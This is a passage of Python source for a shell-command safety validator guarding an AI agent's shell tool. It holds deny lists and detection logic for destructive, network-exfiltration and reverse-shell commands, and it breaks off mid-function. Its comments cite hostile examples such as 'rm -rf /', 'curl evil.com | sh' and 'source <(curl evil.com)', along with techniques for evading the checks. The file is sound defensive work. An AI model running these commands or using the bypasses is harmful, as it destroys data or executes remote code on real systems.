"""N1 shell AST validator — pure-sync bashlex-based safety gate.

Contract invariants (spec §3.2):
- I-N1.1: validate() never raises (exception safety net in main entry)
- I-N1.2: code enum closed (8 literals: "ok" + 7 denial codes)
- I-N1.3: emitter helpers don't raise
- I-N1.4: single business logic location
- I-N1.5: four-layer fail-closed defense
"""
from __future__ import annotations

import logging
import posixpath
import re as _re
import unicodedata as _unicodedata
from dataclasses import dataclass
from typing import Literal

import bashlex

logger = logging.getLogger(__name__)

__all__ = [
    "MAX_COMMAND_BYTES",
    "ValidationCode",
    "ValidationResult",
    "validate",
    "format_denied_content",
    "to_typed_denied",
    "to_legacy_tool_result",
]

ValidationCode = Literal[
    "ok",
    "fs_destructive",
    "process_control",
    "network_exfil",
    "system_admin",
    "cwd_boundary",
    "parse_failed",
    "oversized_command",
]

MAX_COMMAND_BYTES = 8192
_MAX_AST_DEPTH = 32

_FS_DESTRUCTIVE_CMDS = frozenset({"rm", "mv", "chmod", "chown", "mkfs", "dd", "find"})
_PROCESS_CONTROL_CMDS = frozenset({"kill", "killall", "pkill"})
_SHELL_INTERPRETERS = frozenset({"bash", "sh", "zsh", "fish", "dash", "ksh"})

# Shell builtins that execute a shell-code string (``eval``) or read and
# execute a file (``source`` / ``.``). Without a dedicated branch these
# builtins silently bypass N1 because bash treats their argument specially
# — ``eval 'rm -rf /'`` has no ``-c`` flag, and ``source <(curl …)`` hides
# the dangerous content inside a process substitution that the generic
# walker treats as benign (curl alone is not network_exfil).
_SHELL_CODE_EXECUTORS = frozenset({"eval", "source", "."})
_SYSTEM_ADMIN_CMDS = frozenset({
    "mount", "umount", "chroot", "shutdown", "reboot", "systemctl", "init",
})

_CATEGORY_LABEL_ZH: dict[str, str] = {
    "fs_destructive": "文件系统破坏",
    "process_control": "进程控制",
    "network_exfil": "远程脚本执行",
    "system_admin": "系统级操作",
    "cwd_boundary": "路径越界",
    "parse_failed": "命令无法解析",
    "oversized_command": "命令过长",
}

_CANNED_SUGGESTIONS: dict[str, str] = {
    "fs_destructive": "先 `find ... -print` 列出目标并确认后再操作；避免递归强制删除。",
    "process_control": "只针对具体 PID/进程名，避免 `-1` / broad kill。",
    "network_exfil": "先 `wget -O script.sh <url>` 下载审阅，再显式执行。",
    "system_admin": "系统级操作在沙箱内无效；请检查是否走错路径。",
    "cwd_boundary": "目标路径必须在当前工作目录内；不要使用绝对路径或 `..` 逃逸。",
    "parse_failed": "简化命令（拆成多步 / 去除不常见 bash 语法如嵌套 heredoc）。",
    "oversized_command": "拆成多步；单次命令不超过 8KB。",
}

_KNOWN_BASHLEX_KINDS = frozenset({
    "command", "pipe", "pipeline", "compound", "list",
    "commandsubstitution", "processsubstitution",
    "reservedword", "operator", "word", "assignment", "redirect",
    # Leaf expansion markers emitted by bashlex 0.18 inside WordNode.parts.
    # They're opaque placeholders — the validator does NOT expand ${…} / ~ —
    # but they must be recognised so routine commands like ``echo $HOME`` or
    # ``ls ~/project`` do not trip the unknown-kind fail-closed path.
    "parameter", "tilde",
})

# Command wrappers that pass through to an inner executable. These must be
# peeled by ``_resolve_effective_command`` before classification — otherwise
# trivial bypasses like ``env rm -rf /`` or ``sudo rm -rf /`` leak through
# N1's exact-basename category match (spec §5.5).
_COMMAND_WRAPPERS = frozenset({
    "env", "sudo", "nohup", "exec", "time", "nice", "ionice",
    "timeout", "command", "builtin", "stdbuf",
    # ``xargs`` is semantically a downstream-command executor: after its
    # own options, the next argv is the command that ``xargs`` will invoke
    # with stdin-supplied arguments. Peeling it lets the classifier see
    # the real inner command (``xargs rm -rf`` → ``rm -rf``), so bypasses
    # like ``find … | xargs rm -rf`` / ``printf … | xargs -I{} sh -c "…"``
    # land on the normal fs_destructive / network_exfil paths.
    "xargs",
})

_ANSI_ESCAPE_RE = _re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")


_LEADING_TIME_KEYWORD_RE = _re.compile(r"^(\s*)time(\s+|$)")

# ANSI-C ``$'…'`` and locale ``$"…"`` shell literals: bashlex 0.18 parses
# the ``$`` as a parameter expansion and mangles the token, so a payload
# like ``bash -c$'rm -rf /'`` (or ``env --split-string=$'rm -rf /'``)
# never reaches the ``-c`` / ``-S`` re-walk as a valid shell string.
# Stripping the leading ``$`` converts ``$'…'`` into plain ``'…'`` and
# ``$"…"`` into plain ``"…"`` — both of which bashlex handles correctly,
# and the semantic difference (ANSI-C escape decoding vs. locale lookup)
# does not affect what string the inner command ultimately sees for the
# dangerous-payload patterns N1 cares about.
_DOLLAR_QUOTE_PREFIX_RE = _re.compile(r"""\$(?=['"])""")


def _normalize_for_parse(command: str) -> str:
    """Pre-parse normalize: strip ANSI escapes, null bytes, and any leading
    ``time`` reserved-word prefix.

    Per spec §5.5: must NOT NFKC or lowercase (would break bash variable
    semantics like ``$HOME`` → ``$home``).

    ``time`` keyword handling: bashlex 0.18 raises ``NotImplementedError``
    when ``time`` appears as the leading reserved word of a command (it's
    parsed as a POSIX reserved word, not a command name). Without pre-stripping,
    ``time ls -la`` fails closed to ``parse_failed`` — a false positive on
    common benign usage. Since ``time`` is also a pass-through wrapper
    (see ``_COMMAND_WRAPPERS``), stripping a leading ``time`` token here
    is semantically equivalent to wrapper-peeling but happens before the
    parser chokes. The ``/usr/bin/time`` external binary path is
    unaffected — it parses normally as a WordNode and flows through the
    standard resolver peel.
    """
    command = _ANSI_ESCAPE_RE.sub("", command)
    command = command.replace("\x00", "")
    # Convert ``$'…'`` / ``$"…"`` ANSI-C / locale quoting into plain
    # ``'…'`` / ``"…"`` by dropping the ``$`` prefix. bashlex 0.18 otherwise
    # treats the ``$`` as a parameter expansion and mangles the token, so
    # ``bash -c$'rm -rf /'`` and ``env --split-string=$'rm -rf /'`` evade
    # the ``-c`` / ``-S`` re-walk.
    command = _DOLLAR_QUOTE_PREFIX_RE.sub("", command)
    # Iteratively strip leading ``time`` keyword(s). ``time time ls`` is
    # nonsensical bash but handled gracefully; the loop terminates when
    # there is no more leading ``time`` token.
    while True:
        m = _LEADING_TIME_KEYWORD_RE.match(command)
        if not m:
            break
        command = command[m.end():]
    return command


def _match_copy(token: str) -> str:
    """Case/form-folded copy of token for pattern matching only.

    Used to compare against _FS_DESTRUCTIVE_CMDS etc. Never assign
    back to the original token — paths and display values must use
    the original case.
    """
    return _unicodedata.normalize("NFKC", token).lower()


_SYNTHETIC_CWD_ROOT = "/__effective_cwd__"


def _check_path_containment(path_arg: str, effective_cwd: str) -> bool:
    """Lexical containment check — NO realpath / symlink resolution.

    Returns True iff `path_arg` resolves (lexically) to effective_cwd
    or a subpath. Uses posixpath (not os.path) to guarantee POSIX
    semantics on macOS/Linux/Windows runners alike.

    Per spec §5.6:
    - ~user and $VAR are NOT expanded (kept as literal strings);
      such unexpanded prefixes are denied (cannot prove containment
      without evaluating them)
    - symlinks are NOT resolved (pattern match on literal path)
    - empty string is denied defensively

    Relative ``effective_cwd`` handling: callers (notably Skill manifests
    with ``exec_dir: "."``) may pass ``.`` / ``""`` / a bare relative dir.
    We graft a synthetic absolute prefix so the containment arithmetic
    stays correct: any bare-relative ``path_arg`` stays inside the
    synthetic root, any absolute ``path_arg`` is (by definition) outside,
    and ``../..`` escape sequences still normalise above the synthetic
    root. Without this, ``_check_path_containment("a", ".")`` would
    return False and break legitimate native-skill invocations.
    """
    if not path_arg:
        return False
    # Literal tilde / env-var prefixes cannot be proven contained
    # without expansion; per spec §5.6 we deny rather than guess.
    if path_arg.startswith("~") or path_arg.startswith("$"):
        return False

    if posixpath.isabs(effective_cwd):
        cwd_for_math = effective_cwd
    else:
        rel = effective_cwd or "."
        # strip leading "./" segments so normpath(join) works cleanly
        while rel.startswith("./"):
            rel = rel[2:]
        if rel in ("", "."):
            cwd_for_math = _SYNTHETIC_CWD_ROOT
        else:
            cwd_for_math = posixpath.normpath(
                posixpath.join(_SYNTHETIC_CWD_ROOT, rel)
            )

    raw = path_arg
    if posixpath.isabs(raw):
        joined = raw
    else:
        joined = posixpath.join(cwd_for_math, raw)
    normalized = posixpath.normpath(joined)
    cwd_norm = posixpath.normpath(cwd_for_math)
    if normalized == cwd_norm:
        return True
    return normalized.startswith(cwd_norm.rstrip("/") + "/")


_CHMOD_MODE_RE = _re.compile(r"^[0-7]+$|^[ugoa]*[+\-=][rwxXst]+$|^[+\-=][rwxXst]+$")


def _extract_fs_targets(cmd_word: str, args: list[str]) -> list[str]:
    """Extract path-bearing arguments for FS-category commands.

    Handles:
    - POSIX `--` end-of-options marker: args after `--` are all positional
    - Skips leading flags (`-rf`, `--recursive`, etc.) before `--`
    - For `dd`, extracts `of=<path>` value (key=value form)
    - For `chmod`, skips mode specifier (numeric `755` or symbolic `u+x`)
    """
    targets: list[str] = []
    after_double_dash = False
    saw_chmod_mode = False

    for arg in args:
        if after_double_dash:
            targets.append(arg)
            continue
        if arg == "--":
            after_double_dash = True
            continue
        if cmd_word == "dd" and arg.startswith("of="):
            targets.append(arg[len("of="):])
            continue
        if arg.startswith("-"):
            continue
        if cmd_word == "chmod" and not saw_chmod_mode and _CHMOD_MODE_RE.match(arg):
            saw_chmod_mode = True
            continue
        targets.append(arg)

    return targets


@dataclass(frozen=True)
class ValidationResult:
    """Frozen N1 validator output contract (spec §4.2)."""
    allowed: bool
    code: ValidationCode
    category_zh: str
    reason_detail: str
    ast_path: tuple[str, ...]
    nested_depth: int
    triggering_arg: str
    effective_cwd: str
    suggested_alternative: str


def _parse_failed_result(
    *,
    reason_detail: str,
    effective_cwd: str,
    ast_path: tuple[str, ...] = (),
    nested_depth: int = 0,
) -> ValidationResult:
    """Build a parse_failed ValidationResult (DRY for 4 call sites)."""
    return ValidationResult(
        allowed=False,
        code="parse_failed",
        category_zh=_CATEGORY_LABEL_ZH["parse_failed"],
        reason_detail=reason_detail,
        ast_path=ast_path,
        nested_depth=nested_depth,
        triggering_arg="",
        effective_cwd=effective_cwd,
        suggested_alternative=_CANNED_SUGGESTIONS["parse_failed"],
    )


def _classify_command(
    cmd_word: str,
    args: list[str],
    *,
    effective_cwd: str,
    path: list[str],
    depth: int,
) -> ValidationResult | None:
    """Classify a single CommandNode. Returns None if benign.

    Order of checks (matters):
    1. cwd_boundary first (for FS cmds) — so a rm on /etc/passwd returns
       cwd_boundary, not fs_destructive. This gives the LLM a more
       actionable hint.
    2. fs_destructive (rm -rf, mkfs, dd of=/dev/*, etc.)
    3. process_control, system_admin, network_exfil (later tasks)
    """
    match_cmd = _match_copy(cmd_word)

    is_fs_destructive_cmd = (
        match_cmd in _FS_DESTRUCTIVE_CMDS
        or match_cmd.startswith("mkfs.")
    )

    if is_fs_destructive_cmd:
        # Step 1: cwd_boundary check
        fs_targets = _extract_fs_targets(match_cmd.split(".")[0], args)
        for target in fs_targets:
            if not _check_path_containment(target, effective_cwd):
                return ValidationResult(
                    allowed=False,
                    code="cwd_boundary",
                    category_zh=_CATEGORY_LABEL_ZH["cwd_boundary"],
                    reason_detail=f"目标路径 `{target}` 逃出允许范围",
                    ast_path=tuple(path),
                    nested_depth=depth,
                    triggering_arg=target,
                    effective_cwd=effective_cwd,
                    suggested_alternative=_CANNED_SUGGESTIONS["cwd_boundary"],
                )
        # Step 1b: ``find ... -exec <cmd> …`` / ``-execdir`` — the sub-command
        # is itself a shell invocation. Re-validate each clause so danger in
        # the exec target is caught (``find . -exec rm -rf {} +``,
        # ``find . -exec sh -c "<payload>" \\;``, etc.).
        if match_cmd == "find":
            import shlex as _shlex
            for subcmd_tokens in _extract_find_exec_subcmds(args):
                if not subcmd_tokens:
                    continue
                payload = _shlex.join(subcmd_tokens)
                nested = _walk_nested_shell_string(
                    payload,
                    depth=depth + 1,
                    path=path + ["find:-exec"],
                    effective_cwd=effective_cwd,
                )
                if nested is not None:
                    return nested
        # Step 2: dangerous invocation patterns
        if _is_dangerous_fs_invocation(match_cmd, args):
            offending = _first_dangerous_fs_arg(match_cmd, args)
            return ValidationResult(
                allowed=False,
                code="fs_destructive",
                category_zh=_CATEGORY_LABEL_ZH["fs_destructive"],
                reason_detail=f"{cmd_word} 命中危险调用模式: `{offending}`",
                ast_path=tuple(path),
                nested_depth=depth,
                triggering_arg=offending,
                effective_cwd=effective_cwd,
                suggested_alternative=_CANNED_SUGGESTIONS["fs_destructive"],
            )

    if match_cmd in _PROCESS_CONTROL_CMDS:
        if _is_dangerous_process_op(match_cmd, args):
            offending = _first_dangerous_process_arg(match_cmd, args)
            return ValidationResult(
                allowed=False,
                code="process_control",
                category_zh=_CATEGORY_LABEL_ZH["process_control"],
                reason_detail=f"{cmd_word} 命中危险进程操作: `{offending}`",
                ast_path=tuple(path),
                nested_depth=depth,
                triggering_arg=offending,
                effective_cwd=effective_cwd,
                suggested_alternative=_CANNED_SUGGESTIONS["process_control"],
            )

    if match_cmd in _SYSTEM_ADMIN_CMDS:
        return ValidationResult(
            allowed=False,
            code="system_admin",
            category_zh=_CATEGORY_LABEL_ZH["system_admin"],
            reason_detail=f"系统命令 `{cmd_word}` 不允许",
            ast_path=tuple(path),
            nested_depth=depth,
            triggering_arg=cmd_word,
            effective_cwd=effective_cwd,
            suggested_alternative=_CANNED_SUGGESTIONS["system_admin"],
        )

    if match_cmd in _SHELL_INTERPRETERS:
        # Shell interpreter with a ``-c`` command-string argument must be
        # re-validated. POSIX getopt for a flag that takes a value gives
        # three concrete syntactic forms, all of which end up with the
        # command string on bash's argv somewhere:
        #
        #   ``bash -c PAYLOAD``           (bare ``-c``; next argv is payload)
        #   ``bash -cPAYLOAD``            (``c`` at option-bundle position 1;
        #                                  payload glued to the same token)
        #   ``bash -lcPAYLOAD`` (or any   (``c`` anywhere in the short-opt
        #    ``-Xc`` / ``-XYcPAYLOAD``)    cluster; payload is rest-of-token
        #                                  after ``c``; if no rest-of-token,
        #                                  next argv is payload)
        #
        # The quoted shell source ``bash -lc'rm -rf /'`` tokenises as a
        # single argv ``-lcrm -rf /`` (adjacent quoted strings concatenate);
        # without the rest-of-token extraction this sails past the audit.
        for i, a in enumerate(args):
            payload: str | None = None
            if a == "-c" and i + 1 < len(args):
                payload = args[i + 1]
            elif (
                a.startswith("-")
                and not a.startswith("--")
                and "c" in a
                and len(a) >= 2
            ):
                c_idx = a.find("c")  # first ``c`` in the short-opt cluster
                rest = a[c_idx + 1:]
                if rest:
                    payload = rest                     # inline form
                elif i + 1 < len(args):
                    payload = args[i + 1]              # c was last char
            if payload is not None:
                nested = _walk_nested_shell_string(
                    payload,
                    depth=depth + 1,
                    path=path + [f"{cmd_word}:-c"],
                    effective_cwd=effective_cwd,
                )
                if nested is not None:
                    return nested
                break  # only inspect the first ``c``-bearing flag

        if _is_reverse_shell_pattern(args):
            return ValidationResult(
                allowed=False,
                code="network_exfil",
                category_zh=_CATEGORY_LABEL_ZH["network_exfil"],
                reason_detail=f"反向 shell 模式: `{cmd_word} {' '.join(args)[:120]}`",
                ast_path=tuple(path),
                nested_depth=depth,
                triggering_arg="/dev/tcp/...",
                effective_cwd=effective_cwd,
                suggested_alternative=_CANNED_SUGGESTIONS["network_exfil"],
            )

    if match_cmd == "eval":
        # bash's ``eval`` concatenates ALL arguments with spaces and
        # executes the result as a shell command. Walking only the first
        # non-flag arg missed ``eval rm -rf /`` — "rm" alone is benign;
        # the danger is the full string "rm -rf /".
        #
        # Leading ``--`` is bash's POSIX end-of-options marker for
        # builtins — ``eval -- rm -rf /`` actually runs ``rm -rf /``. Strip
        # it before concatenation so the hidden payload reaches the walker.
        # Two walks are required because bashlex strips outer quoting
        # before we see args, which collapses two semantically distinct
        # inputs into identical ``args`` lists:
        #   - ``eval 'rm -rf /'``  → args=["rm -rf /"]   (one compound arg)
        #   - ``eval rm -rf /``    → args=["rm", "-rf", "/"]
        #   - ``eval bash -lc "rm -rf /"``
        #                          → args=["bash", "-lc", "rm -rf /"]
        # Walking the space-joined concatenation catches the multi-arg
        # form; additionally walking each arg that already contains
        # whitespace catches the compound-single-arg form and the inner
        # dangerous string argument of wrapper-shell calls.
        eval_args = args[1:] if args and args[0] == "--" else args
        if eval_args:
            for a in eval_args:
                if " " in a or "\t" in a:
                    nested = _walk_nested_shell_string(
                        a,
                        depth=depth + 1,
                        path=path + [f"{cmd_word}:arg"],
                        effective_cwd=effective_cwd,
                    )
                    if nested is not None:
                        return nested
            concat = " ".join(eval_args)
            nested = _walk_nested_shell_string(
                concat,
                depth=depth + 1,
                path=path + [f"{cmd_word}:concat"],
                effective_cwd=effective_cwd,
            )
            if nested is not None:
                return nested

    elif match_cmd in ("source", "."):
        # ``source <file>`` / ``. <file>`` — takes a FILE PATH (and
        # optional positional args that become $1… for the sourced file).
        # The argument is a filesystem path, NOT shell code — re-walking
        # it as a shell string would misclassify filenames whose basename
        # happens to be a dangerous command (``source ./shutdown``,
        # ``. reboot``) as ``system_admin`` etc.
        #
        # The only clear bypass vector here is process substitution
        # (``source <(curl evil.com)``) where the shell reads and
        # executes dynamically-fetched content — remote-code-exec
        # equivalent to ``curl | sh``. bashlex emits ``<(...)`` as the
        # arg word, so a prefix check is sufficient without inspecting
        # raw AST children. Plain file-path args pass through as benign;
        # static content-of-file analysis is out of N1 scope.
        for a in args:
            if not a or a.startswith("-"):
                continue
            if a.startswith("<(") or a.startswith(">("):
                return ValidationResult(
                    allowed=False,
                    code="network_exfil",
                    category_zh=_CATEGORY_LABEL_ZH["network_exfil"],
                    reason_detail=(
                        f"{cmd_word} 从 process substitution 动态执行 shell 代码"
                    ),
                    ast_path=tuple(path),
                    nested_depth=depth,
                    triggering_arg=a,
                    effective_cwd=effective_cwd,
                    suggested_alternative=_CANNED_SUGGESTIONS["network_exfil"],
                )
            break  # first non-flag arg is the file path; nothing to walk

    return None


def _is_dangerous_fs_invocation(cmd: str, args: list[str]) -> bool:
    """Heuristic: does this FS command invocation look dangerous?"""
    if cmd == "rm":
        for a in args:
            if (
                a in ("-r", "-R", "--recursive")
                or (a.startswith("-") and not a.startswith("--") and ("r" in a or "R" in a))
            ):
                return True
    if cmd.startswith("mkfs"):
        return True
    if cmd == "dd":
        for a in args:
            if a.startswith("of=/dev/"):
                return True
    if cmd == "find" and "-delete" in args:
        return True
    if cmd == "chmod":
        for a in args:
            if a and not a.startswith("-") and _is_dangerous_chmod_mode(a):
                return True
    if cmd == "chown":
        has_r = any(
            a in ("-R", "-r", "--recursive")
            or (a.startswith("-") and not a.startswith("--") and ("R" in a or "r" in a))
            for a in args
        )
        targets_root = any(
            _looks_like_root_ownership(a)
            for a in args
            if not a.startswith("-")
        )
        if has_r and targets_root:
            return True
    return False


# Symbolic chmod mode fragments that grant setuid/setgid:
#   - ``u+s`` / ``g+s`` / ``a+s`` / ``+s`` / ``ugo+xs`` / … (+s form)
#   - ``u=rwxs`` / ``g=…s`` / ``a=…s`` / ``=s`` / ``=rws`` / … (= assignment
#     carrying s, with or without an explicit who — POSIX lets ``who`` be
#     empty and defaults to ``a`` per chmod(1), so ``=s`` IS setuid+setgid).
_CHMOD_SYMBOLIC_DANGER_RE = _re.compile(
    r"(?:^|,)[ugoa]*\+[rwxstX]*s"   # +s form (first clause or after comma)
    r"|(?:^|,)[ugoa]*=[rwxstX]*s"   # = assignment form carrying s (who optional)
)
_OCTAL_DIGITS_RE = _re.compile(r"^[0-7]+$")


def _is_dangerous_chmod_mode(mode_str: str) -> bool:
    """Does ``mode_str`` grant setuid or setgid?

    Octal numeric form is canonicalised via ``int(mode_str, 8)`` — that way
    any leading-zero variant (``04755``, ``004755``, ``4755``) collapses to
    the same integer value and is caught uniformly. The check is a bitmask
    against ``0o6000`` (setuid 4000 ∪ setgid 2000). Symbolic form falls
    back to a regex over ``+s`` and ``=…s`` fragments.
    """
    if not mode_str:
        return False
    if _OCTAL_DIGITS_RE.match(mode_str):
        try:
            value = int(mode_str, 8)
        except ValueError:
            return False
        return bool(value & 0o6000)
    return bool(_CHMOD_SYMBOLIC_DANGER_RE.search(mode_str))


def _is_numeric_root_id(token: str) -> bool:
    """True iff ``token`` is the literal name ``root`` OR any all-digits
    form whose integer value is 0 (``"0"``, ``"00"``, ``"000"``, …).

    Treating leading-zero numeric UIDs as equivalent to bare ``0`` / ``root``
    closes the canonicalisation gap the audit flagged — ``chown -R 00:00``
    has identical effect to ``chown -R 0:0`` / ``chown -R root:root``.
    """
    if not token:
        return False
    if token == "root":
        return True
    if token.isdigit():
        try:
            return int(token) == 0
        except ValueError:
            return False
    return False


def _looks_like_root_ownership(spec: str) -> bool:
    """Does ``spec`` (a ``chown`` target like ``user`` / ``user:group`` /
    ``:group``) name the root account or GID 0 on either side?

    N1 treats *numeric* UID/GID 0 as equivalent to literal ``root`` —
    without this, ``chown -R 0:0 /`` sails past while ``chown -R root:root /``
    gets blocked (cf. audit round 6 P1). Leading-zero forms (``00``,
    ``000``, ``00:00``, ``user:00``, …) are canonicalised too (round 7).
    """
    if not spec or spec.startswith("-"):
        return False
    if _is_numeric_root_id(spec):
        return True
    if ":" in spec:
        uid, _, gid = spec.partition(":")
        if _is_numeric_root_id(uid) or _is_numeric_root_id(gid):
            return True
    return False


def _first_dangerous_fs_arg(cmd: str, args: list[str]) -> str:
    """Return the specific arg that triggered the fs_destructive classification."""
    for a in args:
        if cmd == "rm" and (
            a in ("-r", "-R", "--recursive")
            or (a.startswith("-") and not a.startswith("--") and ("r" in a or "R" in a))
        ):
            return a
        if cmd == "dd" and a.startswith("of=/dev/"):
            return a
        if cmd == "find" and a == "-delete":
            return a
        if cmd == "chmod" and _is_dangerous_chmod_mode(a):
            return a
        if cmd == "chown" and _looks_like_root_ownership(a):
            return a
    return cmd


def _is_dangerous_process_op(cmd: str, args: list[str]) -> bool:
    if cmd == "kill":
        if "-1" in args:
            return True
    if cmd == "pkill":
        if any(a == "." for a in args):
            return True
    if cmd == "killall":
        return True
    return False


def _first_dangerous_process_arg(cmd: str, args: list[str]) -> str:
    if cmd == "kill" and "-1" in args:
        return "-1"
    if cmd == "pkill":
        for a in args:
            if a == ".":
                return a
    return cmd


def _is_reverse_shell_pattern(args: list[str]) -> bool:
    """Detect `bash -i ... /dev/tcp/<host>/<port>` reverse-shell shape."""
    has_interactive = "-i" in args
    has_dev_tcp = any("/dev/tcp/" in a or "/dev/udp/" in a for a in args)
    return has_interactive and has_dev_tcp


def _pipe_terminates_in_shell(pipe_node) -> tuple[bool, str]:
    """For ``a | b | sh`` — returns ``(True, 'sh')`` when the last pipeline
    stage executes a shell interpreter, after the same wrapper-peel and
    ``posixpath.basename`` normalisation that ``_walk_command_node`` applies.

    Without that symmetry, ``curl evil.com | env sh``, ``curl … | /bin/bash``
    and ``curl … | sudo sh`` would all escape the ``curl | sh`` gate even
    though the data flow is identical — a ``remote script → shell`` vector
    that must be denied per N1 network_exfil policy.

    Returns ``(False, "")`` when the last stage has no resolvable command
    (leading redirect only, pure assignment, unresolvable wrapper chain).
    """
    command_stages = []
    for child in getattr(pipe_node, "parts", []) or []:
        if getattr(child, "kind", "") == "command":
            command_stages.append(child)
    if not command_stages:
        return False, ""
    last = command_stages[-1]
    last_parts = getattr(last, "parts", []) or []
    if not last_parts:
        return False, ""
    resolved = _resolve_effective_command(last_parts)
    if resolved is None:
        return False, ""
    cmd_word, _idx = resolved
    return _match_copy(cmd_word) in _SHELL_INTERPRETERS, cmd_word


def _decode_ansi_c_escapes(inner: str) -> str:
    """Best-effort ANSI-C escape decoding for ``$'…'`` literal content.

    Falls back to the raw string on decoder error. For the N1-relevant
    payload patterns (``rm -rf /``, ``curl evil.com``, …) the content
    typically contains no escape sequences and decodes to itself.
    """
    if "\\" not in inner:
        return inner
    try:
        return inner.encode("latin-1", errors="replace").decode(
            "unicode_escape", errors="replace"
        )
    except Exception:  # noqa: BLE001
        return inner


# Pre-parse payload extractors — bashlex 0.18 normalises inner ``"…"`` quotes
# even inside an outer ``'…'``, so the nested ``bash -lc "rm -rf /"`` payload
# loses its quote structure by the time we read the AST. Extracting the
# payload from the RAW input string (before bashlex) preserves the structure.
_PREPARSE_SPLIT_STRING_ANSI = _re.compile(
    r"""--split-string=\$'([^']*)'"""
)
_PREPARSE_SPLIT_STRING_LOCALE = _re.compile(
    r'''--split-string=\$"([^"]*)"'''
)
_PREPARSE_SPLIT_STRING_SEP_ANSI = _re.compile(
    r"""(?:^|\s)-S\s+\$'([^']*)'"""
)
_PREPARSE_SHORTFLAG_C_ANSI = _re.compile(
    # Short-opt cluster containing c, with ANSI-C payload glued in-token.
    # Matches ``-c$'…'``, ``-lc$'…'``, ``-xc$'…'`` etc. The cluster must
    # contain ``c`` (lowercase) somewhere after the leading ``-``.
    r"""(?:^|\s)-[A-Za-z]*c\$'([^']*)'"""
)
_PREPARSE_SHORTFLAG_C_LOCALE = _re.compile(
    r'''(?:^|\s)-[A-Za-z]*c\$"([^"]*)"'''
)


def _ast_has_shell_invoker_at_command_position(ast_nodes) -> bool:
    """True iff any CommandNode reachable from ``ast_nodes`` has its
    effective command word in ``_SHELL_INTERPRETERS`` or equals ``env``
    (wrappers forward to an inner command; ``env`` is the only wrapper
    whose ``-S`` / ``--split-string=`` is a bashlex-mangling trigger).

    Used to gate the preparse ``$'…'`` raw-string scan: the scan would
    otherwise false-positively deny legitimate commands that merely
    *contain* the bypass pattern as data (inside a shell comment, a
    heredoc body, or as a positional argument to ``echo`` / ``printf``
    / etc.). When no shell interpreter appears at command position in
    the parsed AST, there is no execution path for the pattern to be
    dangerous, so preparse is skipped.
    """
    interesting = _SHELL_INTERPRETERS | frozenset({"env"})
    stack = list(ast_nodes)
    while stack:
        node = stack.pop()
        kind = getattr(node, "kind", "")
        if kind == "command":
            parts = getattr(node, "parts", []) or []
            # Check the resolved effective command (peels wrappers → inner).
            resolved = _resolve_effective_command(parts)
            if resolved is not None:
                cmd_word, _idx = resolved
                if _match_copy(cmd_word) in interesting:
                    return True
                # Resolver succeeded to a NON-interesting command — do NOT
                # fall back to the raw first word. ``env FOO=1 echo hi``
                # resolves cleanly to ``echo``, which is benign; previously
                # the first-word-check also accepted the leading ``env`` and
                # let preparse fire on arbitrary text following ``echo``.
            else:
                # Fallback: resolver returned None (wrapper flags consumed
                # everything, e.g. ``env --split-string=<payload>`` — no
                # inner command to land on). In that narrow shape, check
                # the raw first word so the ``env`` mangling trigger is
                # still detected.
                if parts:
                    first = parts[0]
                    first_word = getattr(first, "word", "") or ""
                    if first_word:
                        base = (
                            posixpath.basename(first_word)
                            if "/" in first_word
                            else first_word
                        )
                        if _match_copy(base) in interesting:
                            return True
            # Still descend into parts to catch nested commands in
            # word-level substitutions.
            stack.extend(parts)
            continue
        # Walk any children the node exposes as attributes.
        for attr in ("parts", "list"):
            val = getattr(node, attr, None)
            if isinstance(val, list):
                stack.extend(val)
        inner = getattr(node, "command", None)
        if inner is not None:
            stack.append(inner)
    return False


def _is_inside_outer_quote(command: str, pos: int) -> bool:
    """Best-effort lexical check: is ``command[pos]`` inside a top-level
    ``'…'`` / ``"…"`` quoted region that was opened before ``pos``?

    The preparse ``$'…'`` / ``$"…"`` scan must skip matches that are
    embedded inside an outer quoted string (``echo "… bash -lc$'rm -rf /'
    …"``) — those are data being printed, not shell code being executed.
    Single/double quote state is tracked with a one-level scanner; POSIX
    single quotes preserve everything literally, and inside an outer
    double quote the single quote character doesn't start a new region —
    matching bash's canonical semantics closely enough for the rare
    ambiguities that apply here.
    """
    in_quote: str | None = None
    i = 0
    while i < pos:
        c = command[i]
        if in_quote is None:
            if c in ('"', "'"):
                in_quote = c
        else:
            if c == in_quote and (i == 0 or command[i - 1] != "\\"):
                in_quote = None
        i += 1
    return in_quote is not None


def _preparse_ansi_c_payload_walks(
    command: str,
    *,
    depth: int,
    effective_cwd: str,
) -> "ValidationResult | None":
    """Before bashlex parses, scan the raw source string for known
    payload-carrying forms whose inner quote structure bashlex 0.18 drops
    (``--split-string=$'…'``, ``bash -c$'…'``, ``bash -lc$'…'``, …).
    For each match, decode the ANSI-C escapes and walk the payload as a
    fresh shell string. Returns the first denial found, or None.

    Lexical context filter: skip matches that fall inside an outer quoted
    region (``echo "… $'rm -rf /' …"``). Without the filter, legitimate
    commands that merely PRINT a string containing ``$'…'`` would
    false-positively fail closed — the payload pattern only indicates a
    bypass when the ``$'…'`` literal is being passed as a shell argument
    at the top level, not when it's embedded inside another quoted string.
    """
    for pat in (
        _PREPARSE_SPLIT_STRING_ANSI,
        _PREPARSE_SPLIT_STRING_LOCALE,
        _PREPARSE_SPLIT_STRING_SEP_ANSI,
        _PREPARSE_SHORTFLAG_C_ANSI,
        _PREPARSE_SHORTFLAG_C_LOCALE,
    ):
        for m in pat.finditer(command):
            if _is_inside_outer_quote(command, m.start()):
                continue
            inner = m.group(1)
            payload = _decode_ansi_c_escapes(inner)
            nested = _walk_nested_shell_string(
                payload,
                depth=depth + 1,
                path=["preparse:$'...'"],
                effective_cwd=effective_cwd,
            )
            if nested is not None:
                return nested
    return None


def _extract_env_s_payload(parts: list) -> str | None:
    """If ``parts`` encodes an ``env -S "<string>"`` / ``env --split-string=…``
    invocation, return the ``-S`` value string; else None.

    GNU env's ``-S`` tokenises the value as shell words and prepends them
    to argv. For N1 that means the ``-S`` value IS the real command string
    and must be re-walked. Without this, the generic wrapper-peel treats
    ``-S`` as a flag-with-value, consumes the payload, and leaves nothing
    for the classifier → parse_failed false positive on benign commands
    like ``env -S 'ls -la'``.

    Recognised syntaxes:
      - ``env -S "<string>"``           (separate value token)
      - ``env -S"<string>"`` bundled    (value glued to -S)
      - ``env --split-string=<string>`` (long form, =-separated)
    Leading ``assignment``-kind prefix nodes (``VAR=1 env -S …``) are
    tolerated.
    """
    i = 0
    while i < len(parts) and getattr(parts[i], "kind", "") == "assignment":
        i += 1
    if i >= len(parts):
        return None
    first = parts[i]
    if getattr(first, "kind", "") != "word":
        return None
